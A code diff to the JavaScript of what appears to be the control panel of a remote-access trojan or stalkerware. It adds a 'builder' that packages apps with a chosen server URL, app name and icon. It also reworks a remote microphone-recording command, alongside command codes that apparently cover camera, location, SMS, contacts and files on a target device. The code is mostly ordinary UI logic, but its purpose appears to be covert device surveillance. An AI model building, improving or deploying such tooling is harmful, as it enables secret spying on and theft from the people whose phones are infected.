@@ -9,7 +9,7 @@
         TOAST_DURATION: 3000,
         API_TIMEOUT: 30000,
         COMMAND_DELAYS: {
-            '0xCA': 3000, '0xWI': 3000, '0xLO': 2000, '0xMI': 1000,
+            '0xCA': 3000, '0xWI': 6000, '0xLO': 4000, '0xMI': 1500,
             '0xFI': 2000, '0xIN': 2000, '0xPM': 2000, '0xNO': 2000,
             '0xCB': 1500, '0xSM': 1500, '0xCL': 1500, '0xCO': 1500,
             '0xGP': 1500, '0xFM': 2500, '0xIF': 2000
@@ -169,6 +169,10 @@
     function initBuilder() {
         const urlInput = $('serverUrl');
         const homeInput = $('homePageUrl');
+        const appNameInput = $('appName');
+        const appIconInput = $('appIcon');
+        const iconPreview = $('iconPreview');
+        const resetIconBtn = $('resetIconBtn');
         const autoBtn = $('autoDetectBtn');
         const buildBtn = $('buildBtn');
         const progress = $('progress');
@@ -205,9 +209,32 @@
             showUrlInfo(location.origin);
         };
 
+        // Icon preview handling
+        let selectedIconFile = null;
+        const updateIconPreview = (file) => {
+            if (file) {
+                selectedIconFile = file;
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    if (iconPreview) iconPreview.innerHTML = `<img src="${e.target.result}" alt="Icon preview">`;
+                    if (resetIconBtn) resetIconBtn.style.display = 'inline-flex';
+                };
+                reader.readAsDataURL(file);
+            } else {
+                selectedIconFile = null;
+                if (iconPreview) iconPreview.innerHTML = '<span class="icon-placeholder">No icon selected</span>';
+                if (resetIconBtn) resetIconBtn.style.display = 'none';
+                if (appIconInput) appIconInput.value = '';
+            }
+        };
+
         // Events
         on(urlInput, 'input', e => showUrlInfo(e.target.value));
         on(autoBtn, 'click', autoDetect);
+        on(appIconInput, 'change', (e) => {
+            if (e.target.files && e.target.files[0]) updateIconPreview(e.target.files[0]);
+        });
+        on(resetIconBtn, 'click', () => updateIconPreview(null));
         autoDetect();
 
         // Build
@@ -215,6 +242,7 @@
         on(buildBtn, 'click', async () => {
             const serverUrl = urlInput.value.trim();
             const homePageUrl = homeInput?.value.trim() || '';
+            const appName = appNameInput?.value.trim() || '';
 
             if (!serverUrl) { alert('Please enter server URL'); return; }
             if (!showUrlInfo(serverUrl)) { alert('Invalid URL format'); return; }
@@ -238,7 +266,16 @@
             }, 500);
 
             try {
-                const d = await api('/builder', { method: 'POST', body: { serverUrl, homePageUrl } });
+                // Use FormData for file upload
+                const formData = new FormData();
+                formData.append('serverUrl', serverUrl);
+                formData.append('homePageUrl', homePageUrl);
+                formData.append('appName', appName);
+                if (selectedIconFile) formData.append('appIcon', selectedIconFile);
+
+                const res = await fetch('/builder', { method: 'POST', body: formData });
+                const d = await res.json();
+
                 clearInterval(pollTimer);
                 if (d.error) {
                     if (progressFill) { progressFill.style.width = '100%'; progressFill.style.background = 'var(--error)'; }
@@ -340,34 +377,76 @@
         const progress = $('record-progress');
         const text = $('status-text');
 
-        btn.disabled = true;
-        btn.textContent = '⏳ Recording...';
+        if (btn) {
+            btn.disabled = true;
+            btn.textContent = '⏳ Recording...';
+        }
         status?.classList.remove('hidden');
         if (text) text.textContent = `Recording ${sec}s...`;
+        if (progress) {
+            progress.style.width = '0%';
+            progress.style.background = 'var(--primary)';
+        }
 
+        const startTime = Date.now();
         let elapsed = 0;
-        const timer = setInterval(() => {
-            elapsed += 0.1;
-            if (progress) progress.style.width = Math.min(100, (elapsed / sec) * 100) + '%';
-            if (elapsed >= sec) clearInterval(timer);
-        }, 100);
+        let timer = null;
+        let completed = false;
+
+        // Real progress based on actual elapsed time
+        const updateProgress = () => {
+            elapsed = (Date.now() - startTime) / 1000;
+            const pct = Math.min(100, (elapsed / sec) * 100);
+            if (progress) progress.style.width = pct + '%';
+
+            if (elapsed >= sec && !completed) {
+                completed = true;
+                clearInterval(timer);
+                if (text) text.textContent = 'Processing audio...';
+                if (progress) {
+                    progress.style.width = '100%';
+                    progress.style.background = 'var(--success)';
+                }
+            }
+        };
+
+        timer = setInterval(updateProgress, 100);
 
         sendCmdNoReload('0xMI', { sec })
+            .then((result) => {
+                // Command was sent successfully, but recording is still in progress
+                // Wait for the recording duration to complete
+                const remaining = Math.max(0, (sec * 1000) - (Date.now() - startTime) + 2000);
+                return new Promise(resolve => setTimeout(() => resolve(result), remaining));
+            })
             .then(() => {
-                if (text) text.textContent = 'Complete!';
-                if (progress) { progress.style.width = '100%'; progress.style.background = 'var(--success)'; }
+                clearInterval(timer);
+                completed = true;
+                if (text) text.textContent = 'Complete! Reloading...';
+                if (progress) {
+                    progress.style.width = '100%';
+                    progress.style.background = 'var(--success)';
+                }
                 setTimeout(() => location.reload(), 1500);
             })
-            .catch(() => {
-                if (text) text.textContent = 'Recording failed';
+            .catch((err) => {
+                clearInterval(timer);
+                if (text) text.textContent = 'Recording failed: ' + (err.message || 'Unknown error');
                 if (progress) progress.style.background = 'var(--error)';
             })
             .finally(() => {
                 setTimeout(() => {
-                    btn.disabled = false;
-                    btn.textContent = '🎤 Start Recording';
-                    status?.classList.add('hidden');
-                    if (progress) { progress.style.width = '0%'; progress.style.background = 'var(--primary)'; }
+                    if (btn) {
+                        btn.disabled = false;
+                        btn.textContent = '🎤 Record';
+                    }
+                    if (!completed) {
+                        status?.classList.add('hidden');
+                        if (progress) {
+                            progress.style.width = '0%';
+                            progress.style.background = 'var(--primary)';
+                        }
+                    }
                 }, 3000);
             });
     }
@@ -435,6 +514,49 @@
         sendCmd('0xFM', { action: 'show' });
     }
     window.showFasonApp = showFasonApp;
+
+    // Settings Page
+    async function saveSetting(key, value, multiplier) {
+        const input = document.getElementById(key);
+        const savedIndicator = document.getElementById('saved-' + key);
+        
+        if (value === undefined || value === null) {
+            value = input ? input.value : value;
+        }
+        
+        // Apply multiplier for time conversions
+        if (multiplier && typeof value === 'string') {
+            value = parseInt(value, 10) * multiplier;
+        } else if (typeof value === 'string') {
+            const numValue = parseInt(value, 10);
+            if (!isNaN(numValue)) {
+                value = numValue;
+            }
+        }
+
+        try {
+            const res = await fetch('/api/config', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ key, value })
+            });
+            
+            const data = await res.json();
+            
+            if (data.success) {
+                if (savedIndicator) {
+                    savedIndicator.classList.add('show');
+                    setTimeout(() => savedIndicator.classList.remove('show'), 2000);
+                }
+                toast('Setting saved', 'success');
+            } else {
+                toast(data.error || 'Failed to save', 'error');
+            }
+        } catch (e) {
+            toast('Error saving setting', 'error');
+        }
+    }
+    window.saveSetting = saveSetting;
 
     // Device Info
 
